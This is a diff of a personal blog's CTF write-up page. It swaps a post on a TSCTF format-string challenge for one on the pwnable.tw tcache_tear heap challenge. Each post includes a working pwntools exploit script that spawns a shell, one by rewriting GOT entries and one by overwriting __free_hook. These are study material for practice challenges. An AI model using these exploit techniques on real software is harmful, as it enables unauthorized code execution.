@@ -15,23 +15,23 @@
 
 
 
-<meta name="description" content="刚刚开始学习pwn，记录一下自己学习的过程。 今天get了第二道pwn题目的解答，做的题目是2017年TSCTF的easy fsb，通过这道题了解了一种漏洞和使用该漏洞获取shell的方法：即格式化字符串漏洞，通过找到printf的got表改为system的got表，从而让执行printf函数变成执行system函数再传入/bin/sh参数，从而让程序执行system(‘/bin/sh’)获取sh">
+<meta name="description" content="先看一下题目大体过程：首先可以输入Name保存在0x602060位置处，然后是一个堆操作目录：1是malloc一个小于0xff的chunk，把ptr指针指向chunk，并可以写数据，2是free ptr指针指向的chunk，3是打印0x602060的数据，4退出 题目没有开aslr，free那里存在uaf漏洞，有tcache，思路是： 1.让堆分配到0x602060去并修改0x602060的siz">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习之二">
-<meta property="og:url" content="http://loeklvlh.top/2019/05/10/pwn学习之二/index.html">
+<meta property="og:title" content="pwnable.tw tcache_tear">
+<meta property="og:url" content="http://loeklvlh.top/2019/05/10/pwnable-tw-tcache-tear/index.html">
 <meta property="og:site_name" content="loeklvlh&#39;s blog">
-<meta property="og:description" content="刚刚开始学习pwn，记录一下自己学习的过程。 今天get了第二道pwn题目的解答，做的题目是2017年TSCTF的easy fsb，通过这道题了解了一种漏洞和使用该漏洞获取shell的方法：即格式化字符串漏洞，通过找到printf的got表改为system的got表，从而让执行printf函数变成执行system函数再传入/bin/sh参数，从而让程序执行system(‘/bin/sh’)获取sh">
+<meta property="og:description" content="先看一下题目大体过程：首先可以输入Name保存在0x602060位置处，然后是一个堆操作目录：1是malloc一个小于0xff的chunk，把ptr指针指向chunk，并可以写数据，2是free ptr指针指向的chunk，3是打印0x602060的数据，4退出 题目没有开aslr，free那里存在uaf漏洞，有tcache，思路是： 1.让堆分配到0x602060去并修改0x602060的siz">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwn学习之二/1.png">
-<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwn学习之二/2.png">
-<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwn学习之二/3.png">
-<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwn学习之二/4.png">
-<meta property="og:updated_time" content="2019-05-10T05:59:41.552Z">
+<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwnable-tw-tcache-tear/1.png">
+<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwnable-tw-tcache-tear/2.png">
+<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwnable-tw-tcache-tear/3.png">
+<meta property="og:image" content="http://loeklvlh.top/2019/05/10/pwnable-tw-tcache-tear/4.png">
+<meta property="og:updated_time" content="2019-05-10T06:23:28.942Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习之二">
-<meta name="twitter:description" content="刚刚开始学习pwn，记录一下自己学习的过程。 今天get了第二道pwn题目的解答，做的题目是2017年TSCTF的easy fsb，通过这道题了解了一种漏洞和使用该漏洞获取shell的方法：即格式化字符串漏洞，通过找到printf的got表改为system的got表，从而让执行printf函数变成执行system函数再传入/bin/sh参数，从而让程序执行system(‘/bin/sh’)获取sh">
-<meta name="twitter:image" content="http://loeklvlh.top/2019/05/10/pwn学习之二/1.png">
+<meta name="twitter:title" content="pwnable.tw tcache_tear">
+<meta name="twitter:description" content="先看一下题目大体过程：首先可以输入Name保存在0x602060位置处，然后是一个堆操作目录：1是malloc一个小于0xff的chunk，把ptr指针指向chunk，并可以写数据，2是free ptr指针指向的chunk，3是打印0x602060的数据，4退出 题目没有开aslr，free那里存在uaf漏洞，有tcache，思路是： 1.让堆分配到0x602060去并修改0x602060的siz">
+<meta name="twitter:image" content="http://loeklvlh.top/2019/05/10/pwnable-tw-tcache-tear/1.png">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -63,7 +63,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>pwn学习之二 | loeklvlh&#39;s blog</title>
+<title>pwnable.tw tcache_tear | loeklvlh&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -267,11 +267,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-pwn学习之二" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-pwnable-tw-tcache-tear" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/05/10/pwn学习之二/" class="article-date">
-      <time datetime="2019-05-10T05:50:46.000Z" itemprop="datePublished">2019-05-10</time>
+      <a href="/2019/05/10/pwnable-tw-tcache-tear/" class="article-date">
+      <time datetime="2019-05-10T06:19:35.000Z" itemprop="datePublished">2019-05-10</time>
 </a>
 
 
@@ -286,7 +286,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      pwn学习之二
+      pwnable.tw tcache_tear
     </h1>
   
 
@@ -307,24 +307,16 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>刚刚开始学习pwn，记录一下自己学习的过程。</p>
-<p>今天get了第二道pwn题目的解答，做的题目是2017年TSCTF的easy fsb，通过这道题了解了一种漏洞和使用该漏洞获取shell的方法：即格式化字符串漏洞，通过找到printf的got表改为system的got表，从而让执行printf函数变成执行system函数再传入/bin/sh参数，从而让程序执行system(‘/bin/sh’)获取shell。</p>
-<p>打开ida查看：<br><img src="/2019/05/10/pwn学习之二/1.png" alt="ida"><br>程序逻辑就是执行getname()函数。</p>
-<p>　　进入getname()函数：<br><img src="/2019/05/10/pwn学习之二/2.png" alt="ida"><br>逻辑就是往buf里面写数据然后printf出来，这里由于printf()函数直接调用了buf作为参数，所以存在格式化字符串漏洞。</p>
-<p>格式化字符串漏洞介绍：<a href="http://www.cnblogs.com/Ox9A82/p/5429099.html，http://blog.csdn.net/prettyday/article/details/50366608。" target="_blank" rel="noopener">http://www.cnblogs.com/Ox9A82/p/5429099.html，http://blog.csdn.net/prettyday/article/details/50366608。</a></p>
-<p>本题漏洞利用方法：首先第一轮将exit函数的got表修改成main函数的地址从而让程序能够循环运行<br>接着第二轮将__libc_start_main函数在内存中的地址找出，通过给的so文件计算出system函数地址，<br>第三轮将printf函数的got表更改为system函数的地址，<br>最后一轮输入’/bin/sh\x00’，实际是运行了system(‘/bin/sh’)，最终拿到了shell。<br>通过gdb查看，由于本题未使用保护措施，可以直接通过ida读取到地址(linux加载器分配虚拟页的一个连续的片从0x08048000开始，也就是说elf程序的默认起始地址为0x08048000，之前一直不懂为什么加载前后地址是固定的^_^¦¦¦)，设置断点在存在格式化字符串漏洞的printf位置处，本题为b *0x08048629，然后r运行，输入AAAA，再通过stack 10来查看当前栈：<br><img src="/2019/05/10/pwn学习之二/3.png" alt="ida"><br>可以看出输入值在栈顶偏移7的位置。</p>
-<p>可以通过pwntools中的fmtstr模块来快速生成payload，如要将exit_got表的地址改为main函数的地址：</p>
-<p> main_addr = 0x8048648</p>
-<p> exit_got = 0x804a024</p>
-<p> fmtstr_payload(7,{exit_got:main_addr})</p>
-<p>这样就生成了<br><img src="/2019/05/10/pwn学习之二/4.png" alt="ida"><br>这样的payload，什么意思呢：</p>
-<p>首先，我们知道字符串存在栈中偏移为7的位置，所以这个payload首先在偏移为7的位置写下了0804a024，偏移为8的位置写着0804a025，同理到偏移为10的地址写着0804a027，其实这就是exit_got表的地址所占的4个字节，%x$hhn是将前面的字符个数作为值存入到偏移为x的地方写的地址中，比如这里%7$hhn就会把前面的字符个数作为值写入0804a024这个地址处，所以这里是把56+16存入0804a024中，把56+16+62存入0804a025中，把56+16+62+126存入0804a026中，把56+16+62+126+4存入0804a027中，这里注意：最高是255所以超过的其实是值-256存入，其实这里就是把48,86,04,08分别存入0804a024到0804a027中。</p>
-<p>改完了，就能让程序在结束时循环到开始处，然后就是通过so文件和<strong>libc_start_main函数的真实地址找出system函数的真实地址，通过ida可以找到</strong>libc_start_main函数的got表地址是0804A028，它的真实地址就是0804A028地址处存着的值，可以通过构造payload:\x28\xa0\x04\x08%7$s来获得，然后根据so文件中<strong>libc_start_main函数和system函数的间隔通过</strong>libc_start_main函数真实地址-so文件中的__libc_start_main函数地址+so文件中的system函数地址即可得到system函数的真实地址。</p>
-<p>第三次执行，将得到的system函数的真实地址写入printf函数的got表中，方法同第一步。</p>
-<p>最后一次执行，运行到printf函数传参数时，实际上是给system函数传入参数，所以传入/bin/sh即可执行system(‘/bin/sh’)从而拿到shell。</p>
-<p>fsbpwn.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#init</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(<span class="string">'./fsb'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">'127.0.0.1'</span>,<span class="number">2336</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(pidof(<span class="string">'fsb'</span>)[<span class="number">-1</span>],open(<span class="string">'aa'</span>))</span><br><span class="line"><span class="comment">#-------------------------------------------------</span></span><br><span class="line">main_addr = <span class="number">0x8048648</span></span><br><span class="line">exit_got = <span class="number">0x804a024</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"Welcome~\n"</span>)</span><br><span class="line">payload1 = fmtstr_payload(<span class="number">7</span>,&#123;exit_got:main_addr&#125;)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------------------------------------</span></span><br><span class="line">libc_path = <span class="string">'./libc-32.so'</span></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_start_main_got = <span class="number">0x804A028</span></span><br><span class="line">io.recvuntil(<span class="string">"Welcome~\n"</span>)</span><br><span class="line">io.sendline(p32(libc_start_main_got)+<span class="string">'%7$s'</span>)</span><br><span class="line">libc_start_main = u32(io.recv(<span class="number">8</span>)[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> libc_start_main</span><br><span class="line">system_addr = libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system_addr = '</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------------------------------------</span></span><br><span class="line">printf_got = <span class="number">0x804a014</span></span><br><span class="line">io.recvuntil(<span class="string">"Welcome~\n"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">7</span>,&#123;printf_got:system_addr&#125;)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------------------------------------</span></span><br><span class="line">io.recvuntil(<span class="string">"Welcome~\n"</span>)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
-<p>pwn题目可用:socat tcp4-listen:2336,fork exec:./pwn1挂载，然后通过nc ip 2336去访问</p>
-<p>fsb下载地址：<a href="http://files.cnblogs.com/files/lllkh/pwn1.rar" target="_blank" rel="noopener">http://files.cnblogs.com/files/lllkh/pwn1.rar</a></p>
+        <p>先看一下题目大体过程：<br><img src="/2019/05/10/pwnable-tw-tcache-tear/1.png" alt="ida"><br>首先可以输入Name保存在0x602060位置处，然后是一个堆操作目录：<br><img src="/2019/05/10/pwnable-tw-tcache-tear/2.png" alt="ida"><br>1是malloc一个小于0xff的chunk，把ptr指针指向chunk，并可以写数据，2是free ptr指针指向的chunk，3是打印0x602060的数据，4退出</p>
+<p>题目没有开aslr，free那里存在uaf漏洞，有tcache，思路是：</p>
+<p>1.让堆分配到0x602060去并修改0x602060的size(大于fastbin)</p>
+<p>2.在后面伪造堆(需要伪造下一个堆的size和下下个堆的size(pre_inuse=1))</p>
+<p>3.申请到0x602060去释放，就会把0x602060的位置改成main_arena+96</p>
+<p>4.info泄露出libc</p>
+<p>5.继续利用double free将堆分配到free_hook-0x8上修改为/bin/sh\x00和system即可getshell。</p>
+<p> 注意：这里发现只要fd有值，malloc就会分配同时tcache对应标志位-1，如果tcache标志位为0但是fd仍有值，下一个malloc后，tcache标志位会变为ff，那么你去free一个对应大小的堆的时候，会认为tcache中已经满了而正常释放到unsortedbin里。<br><img src="/2019/05/10/pwnable-tw-tcache-tear/3.png" alt="ida"><br>这是double free同一个堆然后申请了两次的tcache情况，<br><img src="/2019/05/10/pwnable-tw-tcache-tear/4.png" alt="ida"><br>这是再malloc一个堆后tcache的情况。</p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./tcache_tear'</span>)</span><br><span class="line"><span class="comment">#p = remote('chall.pwnable.tw',10207)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">p.sendline(<span class="string">'loeklvlh'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./tcache_tear.so'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Name :'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">alloc(<span class="number">0x8f</span>,<span class="string">'hacked by loeklvlh'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">alloc(<span class="number">0x8f</span>,p64(<span class="number">0x602050</span>))</span><br><span class="line">alloc(<span class="number">0x8f</span>,<span class="string">'hacked by loeklvlh'</span>)</span><br><span class="line">alloc(<span class="number">0x8f</span>,p64(<span class="number">0x6020a0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0x6020e0</span>))<span class="comment">#0x602050</span></span><br><span class="line">alloc(<span class="number">0x7f</span>,<span class="string">'loeklvlh'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">alloc(<span class="number">0x7f</span>,p64(<span class="number">0x602050</span>))</span><br><span class="line">alloc(<span class="number">0x7f</span>,<span class="string">'loeklvlh'</span>)</span><br><span class="line">alloc(<span class="number">0x7f</span>,<span class="string">'loeklvlh'</span>+p64(<span class="number">0x91</span>)) <span class="comment">#0x602050</span></span><br><span class="line">alloc(<span class="number">0x7f</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0x602060</span>)+p64(<span class="number">0x21</span>)) <span class="comment">#0x6020a0</span></span><br><span class="line">alloc(<span class="number">0x7f</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>))<span class="comment">#0x6020e0</span></span><br><span class="line">alloc(<span class="number">0x7f</span>,<span class="string">'loeklvlh'</span>)<span class="comment">#0x602060</span></span><br><span class="line">delete()</span><br><span class="line">info()</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span><span class="number">-0x10</span>-libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc address:"</span>,hex(libc.address)</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc.address+<span class="number">0x4f2c5</span></span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">alloc(<span class="number">0x4f</span>,<span class="string">'loeklvlh'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line">alloc(<span class="number">0x4f</span>,p64(free_hook<span class="number">-0x8</span>))</span><br><span class="line">alloc(<span class="number">0x4f</span>,<span class="string">'loeklvlh'</span>)</span><br><span class="line">alloc(<span class="number">0x4f</span>,<span class="string">'/bin/sh\x00'</span>+p64(system))</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>这里改malloc_hook为one_gadget都不能用，而且试了用double free触发libc_message来调用malloc_hook也失败了这里没搞懂，所以还是改了free_hook。</p>
 
       
     </div>
@@ -333,13 +325,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/05/10/pwn学习之二/">pwn学习之二</a></p>
+        <p><span>本文标题:</span><a href="/2019/05/10/pwnable-tw-tcache-tear/">pwnable.tw tcache_tear</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">loeklvlh</a></p>
-        <p><span>发布时间:</span>2019-05-10, 13:50:46</p>
-        <p><span>最后更新:</span>2019-05-10, 13:59:41</p>
+        <p><span>发布时间:</span>2019-05-10, 14:19:35</p>
+        <p><span>最后更新:</span>2019-05-10, 14:23:28</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/05/10/pwn学习之二/" title="pwn学习之二">http://loeklvlh.top/2019/05/10/pwn学习之二/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://loeklvlh.top/2019/05/10/pwn学习之二/　　作者: loeklvlh" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/10/pwnable-tw-tcache-tear/" title="pwnable.tw tcache_tear">http://loeklvlh.top/2019/05/10/pwnable-tw-tcache-tear/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://loeklvlh.top/2019/05/10/pwnable-tw-tcache-tear/　　作者: loeklvlh" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -352,15 +344,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/05/10/pwn学习之三/">
-                    pwn学习之三
+                <a href="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/">
+                    *CTF 2019 quicksort、babyshell、upxofcpp
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/05/10/pwn学习之一/">
-                    pwn学习之一
+                <a href="/2019/05/10/pyspark如何遍历broadcast/">
+                    pyspark如何遍历broadcast
                 </a>
             </div>
         
@@ -408,7 +400,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"pwn学习之二　| loeklvlh's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"pwnable.tw tcache_tear　| loeklvlh's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -428,7 +420,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/05/10/pwn学习之三/" title="上一篇: pwn学习之三">
+            <a href="/2019/05/10/CTF-2019-quicksort、babyshell、upxofcpp/" title="上一篇: *CTF 2019 quicksort、babyshell、upxofcpp">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -436,7 +428,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/05/10/pwn学习之一/" title="下一篇: pwn学习之一">
+            <a href="/2019/05/10/pyspark如何遍历broadcast/" title="下一篇: pyspark如何遍历broadcast">
                 <i class="fa fa-angle-right"></i>
             </a>
         
